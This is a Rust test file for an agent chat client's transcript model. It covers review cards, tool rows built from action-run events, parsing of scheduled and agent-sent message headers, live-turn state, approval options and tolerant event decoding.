fn review_event(seq: i64, revision: i64, status: &str, draft: Value) -> Event {
    let mut review = review_sample();
    review["revision"] = json!(revision);
    review["status"] = json!(status);
    review["draft"] = draft.clone();
    if status == "answered" {
        review["response"] = draft;
    }
    event(seq, "review.updated", json!({"review": review}))
}

#[test]
fn testReviewCardNeverFoldsIntoToolsAndUpdatesInPlace() {
    let mut model = from_events(vec![call(1, "c1"), call(2, "c2"), review_event(3, 1, "pending", json!({"notes": {}})), call(4, "c3"), call(5, "c4")]);
    assert_eq!(ids(&model), ["g:t:c1", "review:review-1", "g:t:c3"]);
    let old_version = model.row("review:review-1").map(|r| r.version);
    let c = model.apply(vec![review_event(6, 2, "answered", json!({"pickedId": "B", "notes": {"D": "Keep this behaviour"}}))]);
    assert!(c.inserted.is_empty());
    assert!(!c.updated.is_empty());
    assert_ne!(model.row("review:review-1").map(|r| r.version), old_version);
    let Some(RowContent::Review(review)) = model.row("review:review-1").map(|r| &r.content) else { panic!("review card missing") };
    assert_eq!(review.response.as_ref().and_then(|r| r.picked_id()), Some("B"));
    assert_eq!(review.response.as_ref().and_then(|r| r.notes.get("D")).map(String::as_str), Some("Keep this behaviour"));
    assert!(!review.is_pending());
}

#[test]
fn testLatestSnapshotWorksWhenCreationIsOnOlderPage() {
    let mut model = from_events(vec![review_event(20, 3, "answered", json!({"notes": {"A": "Try a wider menu"}})), done(21)]);
    assert_eq!(model.rows().iter().filter(|r| r.kind() == RowKind::Review).count(), 1);
    model.prepend(vec![review_event(2, 1, "pending", json!({"notes": {}})), call(3, "c1"), review_event(4, 2, "pending", json!({"notes": {}})), text(5, "answer", "Review when ready")]);
    let reviews: Vec<&Row> = model.rows().iter().filter(|r| r.kind() == RowKind::Review).collect();
    assert_eq!(reviews.len(), 1);
    assert_eq!(reviews[0].seq, 2);
    let RowContent::Review(review) = &reviews[0].content else { panic!("a review") };
    assert_eq!(review.revision, 3);
    assert_eq!(review.status, "answered");
    assert_eq!(review.response.as_ref().and_then(|r| r.notes.get("A")).map(String::as_str), Some("Try a wider menu"));
    let rebuilt = from_events(model.events().to_vec());
    assert_eq!(rebuilt.items().iter().map(|r| &r.content).collect::<Vec<_>>(), model.items().iter().map(|r| &r.content).collect::<Vec<_>>());
}

#[test]
fn testUnknownStatusIsReadOnlyAndFutureFieldsSurviveDecode() {
    let mut object = review_sample();
    object["status"] = json!("superseded");
    object["futureField"] = json!(true);
    let review = DesignReview::decode(&object).expect("a review");
    assert!(!review.is_pending());
    assert_eq!(review.status, "superseded");
    assert_eq!(review.options.iter().map(|o| o.id.clone()).collect::<Vec<_>>(), ["A", "B", "D"]);
    assert_eq!(review.options.first().and_then(|o| o.image.width), Some(2200));
    assert_eq!(review.options.last().map(|o| o.reference), Some(true));
}

#[test]
fn testAReviewMessageShowsAsItsWords() {
    let message = event(1, "user.message", json!({"text": "Picked B", "images": [], "reviewId": "review-1", "reviewResponse": {"pickedId": "B", "notes": {}}}));
    let model = from_events(vec![message]);
    assert_eq!(RowDebug::text(&model.rows()[0]), "Picked B");
}

#[test]
fn testReviewReplyEventReachesTheBubble() {
    let words = "Review: Picker (r1)\n\nPicked A. Auto account.";
    let e = event(4, "user.message", json!({"text": words, "images": [], "reviewId": "r1", "reviewResponse": {"pickedId": "A", "notes": {}}}));
    let model = from_events(vec![e]);
    let Some(RowContent::User(message)) = model.rows().first().map(|r| &r.content) else { panic!("no bubble") };
    assert_eq!(message.text, words);
    assert_eq!(message.review.as_ref().map(|r| r.lines.clone()), Some(vec![ReviewAnswerLine { label: "Picker".into(), text: "Picked A: Auto account".into() }]));
}

#[test]
fn testReviewReplyLeavesOutWhatHePassedOver() {
    let words = format!("Review: Picker (r1)\n\nPicked A. Auto account.\n\nPassed over: B. Manual. {}", ReviewAnswer::PASSED_OVER_TAIL);
    let e = event(4, "user.message", json!({"text": words, "images": [], "reviewId": "r1", "reviewResponse": {"pickedId": "A", "notes": {}}}));
    let model = from_events(vec![e]);
    let Some(RowContent::User(message)) = model.rows().first().map(|r| &r.content) else { panic!("no bubble") };
    assert_eq!(message.review.as_ref().map(|r| r.lines.clone()), Some(vec![ReviewAnswerLine { label: "Picker".into(), text: "Picked A: Auto account".into() }]));
}

#[test]
fn testActionRunEventBecomesAToolRow() {
    let value = json!({"seq": 7, "ts": "2026-10-27T02:00:00Z", "threadId": "th1", "type": "action.run", "actionId": "tools.typecheck", "patch": "tools", "title": "Typecheck", "command": "npx tsc --noEmit", "ok": false, "exitCode": 2, "text": "src/a.ts(1,1): error TS1\n", "truncated": false, "durationMs": 1234});
    let e = Event::decode(&value).expect("an event");
    let EventPayload::ActionRun(run) = &e.payload else { panic!("not an action run: {:?}", e.payload) };
    assert_eq!(run.exit_code, Some(2));
    assert!(!e.is_transient());
    let (mut call, mut result) = run.as_tool_call();
    call.item_id = ActionRun::item_id(e.seq);
    result.item_id = call.item_id.clone();
    assert_eq!(call.item_id, "action:7");
    assert_eq!(call.title, "Typecheck failed (exit 2)");
    assert_eq!(call.kind, ToolKind::Command);
    assert_eq!(call.input.get("command").and_then(Value::as_str), Some("npx tsc --noEmit"));
    assert!(!result.ok);
    assert_eq!(ToolPresentation::symbol(ToolKind::Command, "action"), "square.dashed");
    assert_eq!(ToolPresentation::symbol(ToolKind::Command, "Bash"), "terminal");
    let model = from_events(vec![e]);
    assert_eq!(ids(&model), ["t:action:7"]);
    let RowContent::Tool(tool) = &model.rows()[0].content else { panic!("not a tool row") };
    assert!(tool.failed());
    assert_eq!(tool.title(), "Typecheck failed (exit 2)");
}

#[test]
fn testScheduledHeader() {
    let header = ScheduledHeader::parse("[Scheduled: \"Check \"prod\", again\", Once, Tue 28 Oct at 15:30]\nIs it up?\nSay so.").expect("a header");
    assert_eq!(header.title, "Check \"prod\", again");
    assert_eq!(header.when_text, "Once, Tue 28 Oct at 15:30");
    assert_eq!(header.body, "Is it up?\nSay so.");
    assert_eq!(ScheduledHeader::parse("Just a message"), None);
    assert_eq!(ScheduledHeader::parse("[Scheduled: no quotes]"), None);
    assert_eq!(ScheduledHeader::parse("[Scheduled: \"T\", Every hour]").map(|h| h.body), Some(String::new()));
}

#[test]
fn testScheduleMessagesAreNotes() {
    let e = event(1, "user.message", json!({"text": "[Scheduled: \"T\", Every hour]\nGo.", "images": [], "origin": "schedule", "scheduleId": "sc1"}));
    let model = from_events(vec![e]);
    let Some(RowContent::User(message)) = model.items().first().map(|r| &r.content) else { panic!("no message") };
    assert!(message.is_from_schedule());
    assert!(!message.is_from_runner());
    assert!(message.shows_as_note());
    assert_eq!(message.scheduled_header().map(|h| h.title), Some("T".to_owned()));
    let typed = UserMessage::new("[Scheduled: \"T\", Every hour]");
    assert!(!typed.shows_as_note(), "Mike typing the header is still Mike");
    assert_eq!(typed.scheduled_header(), None);
}

#[test]
fn testAgentHeader() {
    let header = AgentHeader::parse("[Sent by the agent in the thread \"Mobile app for \"Threadbare\" (v2)\" (f5247e5b)]\n\nFrom f5247e5b: hi.\nBye.").expect("a header");
    assert_eq!(header.title, "Mobile app for \"Threadbare\" (v2)");
    assert_eq!(header.thread_id, "f5247e5b");
    assert_eq!(header.body, "From f5247e5b: hi.\nBye.");
    assert_eq!(AgentHeader::parse("Just a message"), None);
    assert_eq!(AgentHeader::parse("[Sent by the agent in the thread X]"), None);
    assert!(UserMessage::new("[Sent by the agent in the thread \"T\" (12345678)]\n\nGo.").agent_header().is_some());
    let phone = UserMessage { origin: Some("phone".into()), ..UserMessage::new("[Sent by the agent in the thread \"T\" (12345678)]") };
    assert_eq!(phone.agent_header(), None);
    assert!(!UserMessage::new("[Sent by the agent in the thread \"T\" (12345678)]").shows_as_note());
    assert_eq!(header.moved_to, None);
}

#[test]
fn testMoveThenHeader() {
    let header = AgentHeader::parse("[Sent by the agent before moving to /Users/m/dev/threadbear]\n\nCarry on with the tests.").expect("a header");
    assert_eq!(header.moved_to.as_deref(), Some("/Users/m/dev/threadbear"));
    assert_eq!(header.thread_id, "");
    assert_eq!(header.body, "Carry on with the tests.");
    assert!(UserMessage::new("[Sent by the agent before moving to /tmp]\n\nGo.").agent_header().is_some());
    let phone = UserMessage { origin: Some("phone".into()), ..UserMessage::new("[Sent by the agent before moving to /tmp]\n\nGo.") };
    assert_eq!(phone.agent_header(), None);
    assert_eq!(AgentHeader::parse("[Sent by the agent before moving to ]"), None);
    assert_eq!(AgentHeader::parse("[Sent by the agent before moving to /tmp"), None);
}

#[test]
fn testALiveTurnWithNoTurnEventsMakesTheLastGroupLive() {
    let lines = [
        json!({"seq": 1, "ts": "", "threadId": "t", "type": "user.message", "text": "Brief", "images": []}),
        json!({"seq": 2, "ts": "", "threadId": "t", "type": "tool.call", "itemId": "a", "name": "Bash", "kind": "command", "title": "ls", "input": {}}),
        json!({"seq": 3, "ts": "", "threadId": "t", "type": "tool.result", "itemId": "a", "ok": true, "text": "", "truncated": false, "images": []}),
        json!({"seq": 4, "ts": "", "threadId": "t", "type": "tool.call", "itemId": "b", "name": "Bash", "kind": "command", "title": "npm test", "input": {}}),
    ];
    let events: Vec<Event> = lines.iter().map(|v| Event::decode(v).unwrap()).collect();
    let mut model = from_events(events);
    let live_group = |model: &TranscriptModel| {
        model.rows().iter().find_map(|row| match &row.content {
            RowContent::Group(group) => Some(group.is_live),
            _ => None,
        })
    };
    assert_eq!(live_group(&model), Some(false));
    assert!(!model.rows().iter().any(|r| r.kind() == RowKind::Working));
    let base = 1_793_010_000.0;
    let change = model.set_live_turn(Some(""), Some(base));
    assert!(!change.is_empty());
    assert_eq!(live_group(&model), Some(true));
    assert_eq!(model.rows().last().map(|r| r.kind()), Some(RowKind::Working));
    model.set_live_turn(None, None);
    assert_eq!(live_group(&model), Some(false));
    assert!(!model.rows().iter().any(|r| r.kind() == RowKind::Working));
}

// ---- Protocol tolerance (ProtocolToleranceTests and the reasons in Event.swift) ----

#[test]
fn testAnApprovalWithOnlyNewOptionsStillHasButtons() {
    let options = |raw: Value| ApprovalRequest::decode(&json!({"approvalId": "a", "name": "Bash", "options": raw})).expect("an approval").options;
    assert_eq!(options(json!(["allowOnce", "denyForever"])), [ApprovalOption::Allow, ApprovalOption::Deny]);
    assert_eq!(options(json!(["allowOnce", "deny"])), [ApprovalOption::Deny], "known ones kept as they are");
    assert_eq!(options(json!(["allow", "allowAlways", "deny"])), [ApprovalOption::Allow, ApprovalOption::AllowAlways, ApprovalOption::Deny]);
}

/// An event's payload that can't be read keeps its seq as Unknown rather
/// than failing, and a non-object isn't an event at all.
#[test]
fn testAnUnreadablePayloadIsUnknownWithItsSeq() {
    let e = Event::decode(&json!({"seq": 5, "ts": "t", "threadId": "t", "type": "asks.ticked", "ticked": "oops"})).expect("an event");
    assert_eq!(e.seq, 5);
    assert_eq!(e.payload, EventPayload::Unknown);
    let plan = Event::decode(&json!({"seq": 6, "type": "plan.proposed", "text": 5, "itemId": "p1"})).expect("an event");
    assert_eq!(plan.payload, EventPayload::Unknown, "a wrong-typed text fails PlanCardFields");
    assert_eq!(Event::decode(&json!("junk")), None);
    let delta = Event::decode(&json!({"seq": 1, "type": "assistant.text.delta"})).expect("an event");
    assert!(delta.is_transient(), "judged by type too");
    let seq_as_text = Event::decode(&json!({"seq": "12", "type": "error"})).expect("an event");
    assert_eq!(seq_as_text.seq, 12);
    assert_eq!(seq_as_text.payload, EventPayload::Error("Something went wrong".to_owned()));
}
